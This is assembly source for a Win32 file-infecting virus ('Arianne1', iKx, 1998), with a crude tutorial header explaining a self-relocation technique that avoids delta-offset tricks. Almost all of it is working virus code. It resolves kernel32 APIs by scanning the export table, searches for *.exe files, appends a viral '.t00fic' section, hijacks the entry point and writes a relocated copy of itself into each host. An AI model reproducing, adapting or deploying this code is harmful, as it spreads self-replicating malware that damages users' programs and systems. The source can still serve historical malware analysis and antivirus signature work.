   ;
   ;   Mister DiNAM0's magic relocation miniroutines
   ;
   ;
   ;  Hey pal, you remember your first com virus, when typing call deltaoffset
   ;  and discovering the lea instruction. Yes, this old good time when you
   ;  were still discovering sexuality. Now, I will show you somethinge else.
   ;  No, nothing related to sex, but about the delta pointers. I was looking
   ;  my small PE a few days ago, and I tought, these relocs are never used,
   ;  but only for dlls. Fuckoff, that's shit, my virus is also a relocatable
   ;  code, so I could use these datas for my virus. That's rite, but I have to
   ;  save the reloc in my virus code, so what to do ? Okay, Mister DiNAM0 will
   ;  explain you what to do.
   ;
   ;  First, imagine you have coded your self PE virus (I asked a friend on IRC
   ;  to send me a basic one for testing)
   ;
   ;  This virus have all a series of pointers into his code. Usually, you make
   ;  lea edx,[ebp+payload] or such instruction. But this suck, and appears
   ;  strange when tracing/emulating.
   ;
   ;  But, when tasm compile the binary, it build a reloc section. This reloc
   ;  section contains offset where you have to apply the delta pointer. The
   ;  Delta pointer is basically a substraction of actual pointer by image base
   ;  location. Adding this delta pointer result that the original code have
   ;  all pointers and direction correct even if it's not loaded (runned) at
   ;  his native adress
   ;
   ;  Using theses routines have only 1 small difficulty
   ;       -> you have to know how much reloc your virus need
   ;  So the tip is to preview a big buffer for them, like 1 ko, on this exemple
   ;  I just got about 52 bytes of relocation.
   ;
   ;  the BuildFixUp parameters:   ecx = how much of relocation
   ;               edx = from where you start relocation
   ;
   ;  relocation are placed on a buffer called relocbuff (you have to implement
   ;  the buffers somewhere in your virus)
   ;
   ;             return:   ecx = relocbuff ideal size
   ;
   ;  Okay, I got relocation, so what I need to do now ?
   ;
   ;   When infecting, the next copy of your virus will be somewhere else in
   ;  the memory, but as win95/Nt don't apply anymore reloc and they are killed
   ;  with win2K. You can put your virus code in the host, and apply the new
   ;  delta offset to your virus. Now, your virus will be totally integrated to
   ;  his environment. To do such, use the small routine makefixup. Your virus
   ;  will at each infection apply reloc to a copy of his image. So makefixup and
   ;  reloc buffer HAVE TO BE into the virus.
   ;
   ;      makefixup parameters:   edx = new address to apply reloc to
   ;                  esi = old adress from where we come
   ;
   ;  All this can appears a bit complicate, it's very easy to code himself and
   ;  it works well. Anyway, it's a great challenge but stop blabla, show code.
   ;
   ;
   ;                           Mister DiNAM0
   ;
   ; Greets: - to too much underground poeple that nobody knows :)
   ;
   ;

   .386
   locals
   .model flat

   ;Define the needed external functions and constants here.

   extrn       ExitProcess:Proc

   .data                                   ;the data area

   dummy           dd      0               ;this needs some data or it won't work!

   imagebase   equ 00400000h   ;this will have to be fixed
                       ;but it's in 80% of the time the case.
   .code

   HOST:

       mov edx,offset start0   ; this will be a test, we will
       mov ecx,pseudofin-start0    ; drop the virus on the stack
                       ; apply the reloc over there and run
                       ; it
       push    edx
       call    buildfixup      ; generate the self relocations
       pop esi

       mov ecx,finboom-boom    ; copy virus to stack
       sub esp,ecx
       mov edi,esp

       push    edi             ; set for a future call
       push    esi
       push    dword ptr [currentbase]     ; save current base

       mov dword ptr [currentbase],edi ; and preview for apply reloc
       push    edi

       repz    movsb               ; copy it over there
       pop edx             ; and set last image
       pop dword ptr [currentbase]     ; restore it
       pop esi
       sub esi,dword ptr [currentbase] ; calculate new base
       add dword ptr [currentbase],esi
       mov esi,dword ptr [currentbase] ; blablabla
       mov edi,edx

       call    makefixup           ; apply fix ups

       ret                 ; execute virus on stack

   ; build fixup - - - - - - - - - - - - - - It will search himself the offset of
   ;                     relocations, let him do the job

   buildfixup:

       mov eax,edx
       lea ebx,[eax+ecx]

       lea edi,[relocbuff]             ; where will be put rel
       mov esi,dword ptr cs:[imagebase+03Ch]   ; get pe header
       add esi,imagebase

       mov edx,dword ptr cs:[esi+160]      ; point to reloc
       add edx,imagebase               ; sections

       mov ecx,edx
       add ecx,dword ptr cs:[esi+164]      ; relocation size

   relocmylife:

       cmp eax,dword ptr [edx]
       jb  muyloop1                ; not concerned by
                               ; relocation?
       push    ecx
       push    edx

       mov edx,dword ptr [edx]
       mov dword ptr [temporaryRVA0],edx       ; look the rva of
       pop edx                 ; the following
       push    edx                 ; relocs

       lea esi,dword ptr [edx+8]           ; point to rel
       mov ecx,dword ptr [edx+4]
       sub ecx,8                   ; point to rel size

   loopmylife:

       movzx   edx,word ptr [esi]          ; get the curr

       push    edx
       and dh,11110000b

       cmp dh,30h
       pop edx
       jne otherreloctype              ; I never saw other
                               ; type
       and dx,111111111111b
       add edx,dword ptr [temporaryRVA0]
       add edx,imagebase

       cmp edx,eax
       jb  otherreloctype              ; if rel out of
                               ; virus limit,
       cmp edx,ebx                 ; don't save it
       ja  otherreloctype

       sub edx,eax                 ; now save it into
       mov word ptr [edi],dx           ; virus
       add edi,2

   otherreloctype:

       add esi,2                   ; get next reloc

       sub ecx,2
       jnz loopmylife              ; scan each reloc

       pop edx
       pop ecx

   muyloop1:

       add edx,dword ptr cs:[edx+4]        ; look if there's other
       cmp edx,ecx                 ; relocation block
       jb  relocmylife

   finishapplyreloc:

       mov ecx,edi
       sub ecx,offset relocbuff            ; return size of
       ret                     ; relocation buffer

   currentbase:    dd  imagebase           ; take care only
   temporaryRVA0:  dd  0               ; if image base <>
                               ; 00400000h
   ; build fixup - - - - - - - - - - - - - -

   boom:

   win9x   equ 0BFF70000h
   winNt   equ 077f00000h

   ; win2000 equ 07bf0000h ???

   kernelbase  equ     win9x

   start0:
       pushad                  ; save all reg
                           ; IP of Odelta + 5
       push    dword ptr [ReturnToHost]    ; save the return to host
                       ; yeah it's a dumb way but I don't
                       ; want to code an other
           lea     edx,[Apilist]       ; set the GetTheList procedure
       lea ebx,[Hardcoded]
           mov     ecx,7               ; number of api

   GetTheList:                 ; now start the loop

           push    ecx ebx
       Call    GetProc             ; get the RVA of the API in ebx
           pop     ebx ecx
       cmp eax,-1
       je  Fini                ; if problem then quit
       mov dword ptr [ebx],eax
       add ebx,4
           loop    GetTheList          ; get ALL Apis

       call    FindFirst           ; find 1st file in the
       cmp eax,-1              ; directory
       je  Error0

   boucle: call    Infection           ; infect it

       call    FindNext            ; scan if there's an other one
       cmp     eax,0
       jne     boucle

   Error0:

   Fini:       pop dword ptr [ReturnToHost]    ; restore host IP back
           popad                   ; restore everything
           db  0B8h                ; push host original
                               ; entry point
   ReturnToHost:   dd  0

           push    eax             ; put in eax so the
           ret                 ; emulation is perfect
                       ; take a look on the SEH ( eax in win95
                       ; equal Entry Point RVA
   Infection:                  ; Pseudo :]

       call    Open_file           ; open file
       jz  Finished

       mov     edx,03ch
       call    Seek_file           ; search at 3Ch the offset of
                           ; the extended exe header
       mov ecx,04h             ; Read 4 bytes and
       lea     edx,[ReadyForHost]      ; save it in ReadyForHost
       call    Read_file

       mov     edx,dword ptr [ReadyForHost]     ; set edx at ReadyForHost
       push    edx
       call    Seek_file           ; seek to edx in the current
                           ; file
       mov     ecx,(4096/2)+0f8h
       lea edx,[ReadyForHost]      ; read a lot of bytes from
       call    Read_file           ; there ( just to play with
       pop edx             ; section

       cmp     word ptr [ReadyForHost],'EP'    ; look if that's really
       jne     CloseFile           ; a Portable exe

       push    edx             ; edx equal the offset of the
                           ; header
       xor eax,eax
       mov     ax,word ptr [ReadyForHost+6]   ; ax = number of section
       inc word ptr [ReadyForHost+6]   ;add 1 to the number of section
       dec eax             ; now we have to found
       mov     ecx,28h             ; the offset of the last
       mul ecx             ; section to drop our
       push    eax             ; viral section
       pop esi             ; then Esi equal where we drop

       lea esi,[ReadyForHost+0f8h+esi] ; point esi to our buffer
       cmp dword ptr [esi],'00t.'      ; look if we are already here
       pop edx         ; fucking lame stack optimization
       je  CloseFile           ; then close file
       push    edx
       lea edi,[esi+28h]           ; copy the previous section
       mov     ecx,40
       repz    movsb

       lea edi,[edi-40]            ; now edi point to the section
       lea     esi,[InputToHost]       ; and ESI to the '.Star0'
       mov ecx,8               ; string , set the name of
       repz    movsb               ; our section

       lea esi,[edi-8-40]      ; esi point to the last section
       lea edi,[esi+40]        ; and edi to our viral section

       mov     ecx,dword ptr [ReadyForHost+56] ; calculate the
       mov     eax,dword ptr [esi+8]           ; new RVA of the
       add eax,dword ptr [esi+12]          ; viral section
       call    Divit
       mov dword ptr [edi+12],eax

       mov ecx,dword ptr [ReadyForHost+40]
       add ecx,dword ptr [ReadyForHost+52] ; keep original entry
       mov dword ptr [ReturnToHost],ecx    ; point
   ;   add eax,3               ; forgot to delete that line :[
       mov dword ptr [ReadyForHost+40],eax ; set ENtry point to
                               ; viral RVA

       mov ecx,dword ptr [ReadyForHost+56] ; calculate virtual
       mov eax,fin-start0              ; size in order of
       call    Divit                   ; the object align
       mov dword ptr [edi+8],eax

       mov     eax,dword ptr [esi+20]      ; get the offset of the last
       add eax,dword ptr [esi+16]      ; plus his size
       mov     dword ptr [edi+20],eax      ; and that physical offset of
       push    eax             ; our virus

       mov ecx,dword ptr [ReadyForHost+60] ; calculate physical
       mov eax,pseudofin-start0            ; in order with size
       call    Divit                   ; align
       mov dword ptr [edi+16],eax          ; save it in our viral
                               ; section
       mov dword ptr [edi+36],20000000h or 40000000h or 80000000h
                       ; set the viral section flags
       mov ecx,dword ptr [ReadyForHost+60] ; add to the image
       mov     eax,dword ptr [ReadyForHost+80] ; size our virus size
       add     eax,fin-start0
       call    Divit
       mov dword ptr [ReadyForHost+80],eax ; save it

       pop edx
       call    Seek_file               ; seek to previewved
                               ; endoffile
   ;---

           mov     ecx,pseudofin-start0            ; we copy virus image
       mov esi,offset start0           ; to stack
       sub esp,ecx                 ; too lazy to alloc
       mov edi,esp                 ; memory

       push    edi
       push    edi
       repz    movsb                   ; copy it
       pop edi

       mov esi,offset start0           ; the start of the
                               ; virus
       mov edx,dword ptr [ReadyForHost+40]     ; our new entrypoint
       add edx,dword ptr [ReadyForHost+52]     ; will be destination
       call    makefixup               ; apply relocations

       mov ecx,pseudofin-start0            ; write physical image
       pop edx
       call    Write_file              ; write the virus body
           add     esp,pseudofin-start0            ; restore stack

   ; --

       pop edx                 ; seek to the header
       call    Seek_file

       mov ecx,(4096/2)+0F8h
       lea edx,[ReadyForHost]
       Call    Write_file              ; drop the header

   CloseFile:

       call    Close_file              ; close the file

   Finished:

       ret

   GetProc:            ; kernel scanner

       mov     eax,-1
       push    ebp
       mov edi,kernelbase          ; prerecorded address of the
       cmp word ptr [edi],'ZM'     ; kernel
       jne badpoint            ; verify if it's exe
                           ; but it should allways
       xor ebx,ebx
       mov bx,word ptr [edi+3Ch]       ; look at [3Ch]
       mov esi,edi
       add edi,ebx

       cmp dword ptr [edi],'EP'        ; if it's PE but it should
       jne badpoint            ; allways

       mov ebx,dword ptr [edi+120]     ; get the export RVA and set
       lea edi,[esi+ebx]           ; to edi

       mov ecx,dword ptr [edi+24]  ; ecx equal number of exports
       mov ebx,dword ptr [edi+32]  ; ebx point to name pointer table
       add ebx,esi         ; so ebx point to the pointer table
       mov ebp,edx         ; ebp is the offset of the asked API

   Scanstring:             ; this procedure look if the asked
                       ; api name are equal of the current
       mov eax,dword ptr [ebx] ; scanned api name , but we test
       add eax,esi         ; just 4 bytes to gain speed

       mov eax,dword ptr [eax]
       cmp     dword ptr [edx],eax
       je  TestName

   Heresebx:

       mov edx,ebp         ; if not then set again ebp
                       ; if we had tests fail (in TestName)
       add     ebx,4           ; and test the next Kernel API
       dec ecx         ; if ecx are finish the scan fuckup!
       jnz     Scanstring

       mov     eax,-1          ; return with error code
       jmp badpoint

   TestName:

       mov eax,dword ptr [ebx] ; here we test all the name
       add eax,esi         ; there's some ApiDoSomethingA who
                       ; have a brother ApiDoSomethingW
   TestName0:

       push    eax
       mov al,byte ptr [eax]   ; test the byte
       cmp byte ptr [edx],al
       pop eax
       jne Heresebx        ; and if not equal then byebye
       inc eax
       inc edx
       cmp     byte ptr [edx+1],0  ; if we have zero then everything are
       jne     TestName0       ; okkkkkkkkkkkkayyyyyyyyyyyyy

       mov al,byte ptr [eax]   ; test last byte if okay
       cmp byte ptr [edx],al   ; if not failed
       jne     Heresebx

       add edx,2           ; so we have in edx+2 the ordinal of
       push    edx         ; the api

       mov eax,dword ptr [edi+24]  ; this is set to get the api , I don't
       sub eax,ecx         ; really remember how I did that
       shl eax,1           ; it was quite complex

       add eax,dword ptr [edi+36]      ; table RVA
       add eax,esi             ; Add Rva
       xor ebx,ebx             ; set ebx to 0
       mov bx,word ptr [eax]       ;
       xchg    eax,ebx

       shl eax,2

       add eax,dword ptr [edi+28]
       add eax,esi

       mov     eax,dword ptr [eax]
       add eax,esi             ; eax = the asked rva

       pop edx

   badpoint:

       pop ebp
       ret

   makefixup:

       sub edx,esi             ; get new delta offset
       mov eax,offset relocbuff        ; eax point to the virus

   bouclemylife:

       movzx   ebx,word ptr [eax]      ; get reloc offset item
       cmp ebx,0               ;
       je  finishapply
       add ebx,edi             ; then get offset where patchin

       add dword ptr [ebx],edx     ; apply patch
       add eax,2
       jmp bouclemylife            ; do next

   finishapply:

       ret                 ; that's finish


   ;
   ;   Functions often called , revised by me to be more easy to call from
   ;   an infection process
   ;

   Divit:

   xor edx,edx
   div ecx
   inc eax
   mul ecx
   ret

   FindFirst:


   push    offset File_Data
   push    offset Exe_File

   call    dword ptr [FindFirstFile]
   mov     dword ptr [Handle],eax
   ret

   FindNext:

   push    offset File_Data
   push    dword ptr [Handle]

   Call    dword ptr [FindNextFile]

   ret

   Open_file:
   push large 0
   push large 080h
   push large 3
   push large 0
   push large 0
   push 80000000h or 40000000h

   push offset File_Data+02ch

   Call dword ptr [CreateFile]

   mov dword ptr [CurrentHandle],eax
   inc eax
   ret

   Close_file:
   push dword ptr [CurrentHandle]
   call dword ptr [Close]
   ret

   Write_file:
   mov eax,offset Write
   jmp Action_file

   Read_file:

   mov eax,offset Read

   Action_file:

   push 0
   push offset Iobytes
   push ecx
   push edx
   push dword ptr [CurrentHandle]
   Call dword ptr [eax]
   ret

   Seek_file:
   push large 0
   push large 0
   push edx
   push dword ptr [CurrentHandle]
   Call dword ptr [SeekFile]
   ret

   Apilist:                    ; the list of api we have to

   db  'FindFirstFileA',0          ; found in the kernel in
   db  'FindNextFileA',0           ; memory
   db  'CreateFileA',0
   db  '_lclose',0
   db  'WriteFile',0
   db  'ReadFile',0
   db  'SetFilePointer',0

   trademark:  db ' Arianne1 virus - 06/98 -iKx-Industries'

   InputToHost:    db '.t00fic',0,0
   Exe_File:   db '*.exe',0

   relocbuff:  db  05Ch+2  dup (0)

   Hardcoded:

   FindFirstFile:
           dd 0
   FindNextFile:
           dd 0
   CreateFile:
           dd 0
   Close:
           dd 0
   Write:
           dd 0
   Read:
           dd 0
   SeekFile:
           dd 0

   pseudofin:

   Handle:     dd  0
   CurrentHandle:  dd  0
   Iobytes:    dd  0

   File_Data:  db  2ch+13+5 dup (0)

   ReadyForHost:   db  0F8h dup (0)
   TableHost:  db  4096/2 dup (0)

   fin:

   finboom:

   ends
   end HOST
